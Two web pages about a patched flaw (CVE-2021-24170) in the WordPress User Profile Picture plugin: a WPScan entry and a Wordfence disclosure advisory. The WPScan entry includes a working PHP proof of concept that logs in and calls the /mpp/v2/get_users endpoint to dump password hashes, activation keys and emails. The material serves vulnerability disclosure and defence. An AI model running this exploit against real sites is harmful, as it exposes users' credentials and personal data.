=== Content from wpscan.com_b136a88b_20250114_231028.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# User Profile Picture < 2.5.0 - Sensitive Information Disclosure

### Description

The REST API endpoint get\_users in the plugin returned more information than was required for its functionality to users with the upload\_files capability. This included password hashes, hashed user activation keys, usernames, emails, and other less sensitive information.

### Proof of Concept

Usage: php poc.php author password
<?php
// Settings
$wp\_url = $argv[1];
$wp\_user = $argv[2];
$wp\_pass = $argv[3];
// Log in as subscriber
$ch = curl\_init();
$cookiejar = tempnam(sys\_get\_temp\_dir(), 'cookiejar-');
curl\_setopt($ch, CURLOPT\_URL, $wp\_url . '/wp-login.php');
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
curl\_setopt($ch, CURLOPT\_POST, true);
curl\_setopt($ch, CURLOPT\_POSTFIELDS, [
'log' => $wp\_user,
'pwd' => $wp\_pass,
'rememberme' => 'forever',
'wp-submit' => 'Log+In',
]);
$output = curl\_exec($ch);
curl\_close($ch);
// Get a rest nonce.
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, $wp\_url . '/wp-admin/admin-ajax.php?action=rest-nonce');
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
curl\_setopt($ch, CURLOPT\_POST, true);
$nonce = curl\_exec($ch);
// Get user info.
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, $wp\_url . '/index.php?rest\_route=/mpp/v2/get\_users');
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_HTTPHEADER, array('X-WP-Nonce: ' . $nonce));
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
curl\_setopt($ch, CURLOPT\_POST, true);
$output = curl\_exec($ch);
curl\_close($ch);
print\_r($output);
?>

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

metronet-profile-picture](https://a8cteam5105.wordpress.com/plugin/metronet-profile-picture/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 2.5.0

### References

CVE
[CVE-2021-24170](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24170)

URL
<https://www.wordfence.com/blog/2021/03/medium-severity-vulnerability-patched-in-user-profile-picture-plugin/>

### Classification

Type
SENSITIVE DATA DISCLOSURE

OWASP top 10
[A3: Sensitive Data Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure)

CWE
[CWE-200](https://cwe.mitre.org/data/definitions/200.html)

CVSS
[6.5 (medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

### Miscellaneous

Original Researcher
Chloe Chamberland

Submitter
Chloe Chamberland

Submitter website
<https://wordfence.com>

Submitter twitter
[infosecchloe](//twitter.com/infosecchloe)

Verified
Yes

WPVDB ID
[29fc5b0e-0a5f-4484-a1e6-a0a1206726cc](https://a8cteam5105.wordpress.com/vulnerability/29fc5b0e-0a5f-4484-a1e6-a0a1206726cc/)

### Timeline

Publicly Published
2021-03-03 (about 3 years ago)

Added
2021-03-03 (about 3 years ago)

Last Updated
2021-04-03 (about 3 years ago)

### Other

Published
Title

Published
2024-12-11
Title
[Essential Real Estate < 5.1.7 - Missing Authorization to Authenticated (Contributor+) Information Exposure](https://a8cteam5105.wordpress.com/vulnerability/00229a17-7b24-44df-8c46-fadebd315e44/)

Published
2024-11-04
Title
[140+ Widgets | Xpro Addons For Elementor – FREE < 1.4.6.1 - Authenticated (Contributor+) Sensitive Information Exposure via Elementor Template](https://a8cteam5105.wordpress.com/vulnerability/fadbf1e2-321b-4e00-96cd-fce128200190/)

Published
2024-04-25
Title
[User Meta < 3.1 - Unauthenticated Sensitive Information Exposure](https://a8cteam5105.wordpress.com/vulnerability/3b75549c-3fc5-4e6f-84ae-264d8276bfb3/)

Published
2023-10-09
Title
[Image Regenerate & Select Crop < 7.3.1 - Sensitive Information Exposure](https://a8cteam5105.wordpress.com/vulnerability/24bbe88a-aed3-45ab-8515-0fae98de8b10/)

Published
2023-12-28
Title
[Affiliates Manager < 2.9.31 - Sensitive Information Exposure via Log File](https://a8cteam5105.wordpress.com/vulnerability/7ec7c9c7-ec89-43a3-b79d-64fd74874250/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from www.wordfence.com_b30c8c39_20250114_231029.html ===


![](https://www.wordfence.com/wp-content/uploads/2021/03/Medium-Severity-Vulnerability-Patched-in-User-Profile-Picture-Plugin.jpg)

[![](https://secure.gravatar.com/avatar/9bf72594e071c28445ed7a1be0de1a23?s=80&d=mm&r=g)Chloe Chamberland](https://www.wordfence.com/blog/author/wfchloe/)

March 3, 2021

# Medium Severity Vulnerability Patched in User Profile Picture Plugin

On February 15, 2021, our Threat Intelligence team initiated the responsible disclosure process for a vulnerability that we discovered in [User Profile Picture](https://wordpress.org/plugins/metronet-profile-picture/), a WordPress plugin installed on over 60,000 sites. The vulnerability made it possible for authenticated users with the `upload_files` capability to obtain sensitive user information.

We initially reached out to Cozmoslabs, the plugin’s vendor, on February 15, 2021 through their contact form. On February 17, 2021 Cozmoslabs confirmed the inbox for handling discussion and we sent over the full disclosure details. Just a day later we received a response from the plugin’s original developer along with a proposed patch for us to test. We confirmed the patch was adequate and provided an additional security recommendation. They released the patch the same day on February 18, 2021. We highly recommend updating to the fully patched version, 2.5.0, immediately.

Wordfence Premium users received a firewall rule to protect against any exploit attempts targeting this vulnerability on February 15, 2021. Sites still using the free version of Wordfence will receive the same protection on March 17, 2021.

**Description:** Sensitive Information Disclosure

**Affected Plugin:** User Profile Picture

**Plugin Slug:** metronet-profile-picture

**Affected Versions:** <= 2.4.0

**CVE ID:** [CVE-2021-24170](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24170)

**CVSS Score:** 6.5 (Medium)

**CVSS Vector:** [CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Fully Patched Version:** 2.5.0

User Profile Picture is a plugin designed to allow site owners to upload profile pictures for individual users. By default, WordPress will set a users profile picture to the associated Gravatar, if present, for any given email. This plugin makes it so that user profile pictures can be customized and can override the Gravatar associated with an email address.

One feature the plugin offered was the ability to add user profiles to a post using a Gutenberg block. When adding the block to a post, the plugin made a request for user data to retrieve the users profile picture and username for users with access to the Gutenberg editor in order to add the information to the block. To retrieve this information, the plugin registered the REST API route `/mpp/v2/get_users` tied to the `rest_api_get_users` function.

```
register_rest_route(
                        'mpp/v2',
                        '/get_users',
                        array(
                                'methods'             => 'POST',
                                'callback'            => array( $this, 'rest_api_get_users' ),
                                'permission_callback' => array( $this, 'rest_get_users_permissions_callback' ),
                        )

```

Unfortunately, this REST API endpoint returned more information than was required for its functionality. This included password hashes, hashed user activation keys, usernames, emails, and other less sensitive information.

![](https://www.wordfence.com/wp-content/uploads/2021/03/UserProfilePictureExploit-300x204.png)

A look at the User Profile Picture exploit.

The REST API endpoint did have a permissions callback preventing users from accessing it unless they had the `upload_files` capability. By default this would only be available to users in the author role and above. However, the User Profile Picture plugin page promotes a separate plugin, Profile Builder, by the same developers, noting that it can be used to allow other roles to upload images. By doing so, a site owner would make it possible for users and roles that do not have the `upload_files` capability by default to upload their own profile photos. It is likely that a number of site owners have granted this capability to lower-level users.

In a normal configuration, all authors and editors could retrieve this sensitive information. In addition, any sites where the `upload_files` capability had been granted to lower-privileged users could be exploited by those users to retrieve this information as well.

If an attacker were able to crack a password or user activation key, then they could potentially log into the vulnerable WordPress site and effectively take it over. However, it should be noted that WordPress passwords and user activation keys are salted and hashed with strong cryptography and, therefore, would be very hard to crack for further use, especially if strong passwords are being used.

## Disclosure Timeline

**February 15, 2021** **–** Conclusion of the plugin analysis that led to the discovery of the vulnerability. We develop a firewall rule to protect Wordfence customers and release it to Wordfence Premium users. We made our initial contact attempt with the vendor, CozmosLabs.

**February 17, 2021** **–** We receive a response confirming appropriate inbox for handling discussion. We provide full disclosure details.

**February 18, 2021** **–** We receive an acknowledgement from Ronald Huereca, the original plugin developer, along with a proposed fix. We verify that the fix addresses the security issue and provide an additional security recommendation.

**February 18, 2021** **–** A patched version of the plugin is released as version 2.5.0. We verify again that the vulnerability has been patched.

**March 17, 2021 –** Free Wordfence users will receive firewall rule.

## Conclusion

In today’s post, we detailed a flaw in the User Profile Picture plugin that granted attackers the ability to obtain sensitive information like hashed user passwords. This flaw has been fully patched in version 2.5.0. We recommend that users immediately update to the latest version available, which is version 2.5.0 at the time of this publication.

[Wordfence Premium](https://www.wordfence.com/wordfence-signup/?promo_id=blog20210303&promo_name=get-premium&promo_creative=txt&promo_position=conclusion) users received a firewall rule protecting against this vulnerability on February 15, 2021, while those still using the free version of Wordfence will receive the same protection on March 17, 2021.

If you know a friend or colleague who is using this plugin on their site, we highly recommend forwarding this advisory to them to help keep their sites protected.

*Special thanks to Ronald Huereca, the original developer of the plugin, for working promptly to get a patch out to customers.*

Search

### Trust Your Site to the Leader in WordPress Security

Wordfence includes an endpoint firewall, malware scanner, robust login security features, live traffic views, and more. Discover why over 5 million WordPress sites put their trust in Wordfence.

[Protect Your Site](/products/pricing/)

**Did you enjoy this post? Share it!**

[*Facebook*](http://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F03%2Fmedium-severity-vulnerability-patched-in-user-profile-picture-plugin%2F)
[*Twitter*](https://twitter.com/share?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F03%2Fmedium-severity-vulnerability-patched-in-user-profile-picture-plugin%2F&text=Medium%20Severity%20Vulnerability%20Patched%20in%20User%20Profile%20Picture%20Plugin&via=wordfence)
[*LinkedIn*](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F03%2Fmedium-severity-vulnerability-patched-in-user-profile-picture-plugin%2F)

## Comments

2 Comments

* ![](https://secure.gravatar.com/avatar/ea718fa84e61b089747ea1c0e7f6b9cd?s=96&d=mm&r=g)
  SallyHoffmanDesigns
  March 3, 2021
   8:54 am

  So am I to understand that the issue has been taken care of and my site is now safer. Do I need to do anything to implement this fix?

+ ![](https://secure.gravatar.com/avatar/9bf72594e071c28445ed7a1be0de1a23?s=96&d=mm&r=g)
  Chloe Chamberland
  March 3, 2021
   11:55 am

  Hi Sally,

  The issue has been fixed and patched in the latest version of the plugin, please just make sure that you have updated the plugin to the latest version 2.5.0 to be sure your site is fully protected.

### Breaking WordPress Security Research in your inbox as it happens.

![Example of a news story](/img/footer-news-example.jpg)

This site uses cookies in accordance with our [Privacy Policy](/privacy-policy).

Cookie Settings
Accept All

## Cookie Options

For additional information on how this site uses cookies, please review our [Privacy Policy](/privacy-policy). The cookies used by this site are classified into the following categories and can be configured below.

### Strictly Necessary

These Cookies are necessary for the Sites and Services to work properly. They include any essential authentication and authorization cookies for the Services.

\* Cookies of this category are necessary for the site to function and cannot be disabled.

### Performance/Analytical

These Cookies allow us to collect certain information about how you navigate the Sites or utilize the Services running on your device. They help us understand which areas you use and what we can do to improve them.

### Targeting

These Cookies are used to deliver relevant information related to the Services to an identified machine or other device (not a named or otherwise identifiable person) which has previously been used to visit our Sites. Some of these types of Cookies on our Sites are operated by third parties with our permission and are used to identify advertising sources that are effectively driving customers to our Sites.

Cancel
Save


